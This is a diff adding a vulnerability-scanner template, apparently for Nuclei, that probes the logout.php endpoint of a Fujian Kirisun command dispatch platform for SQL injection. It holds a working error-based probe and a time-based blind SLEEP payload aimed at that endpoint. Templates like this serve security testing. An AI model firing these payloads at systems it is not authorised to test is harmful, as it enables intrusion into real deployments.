@@ -1,0 +1,46 @@
+id: poc-yaml-kirisun-logout-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 logout.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(2, 5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /custom/zx/logout.php?sign=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL执行失败"
+          - "SQL syntax"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /custom/zx/logout.php?sign=1%27+AND+(SELECT+4068+FROM+(SELECT(SLEEP({{t1}})))Vgsc)--+qhh HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"msg\":\"ok\""
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - '!contains(body, "<")'
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
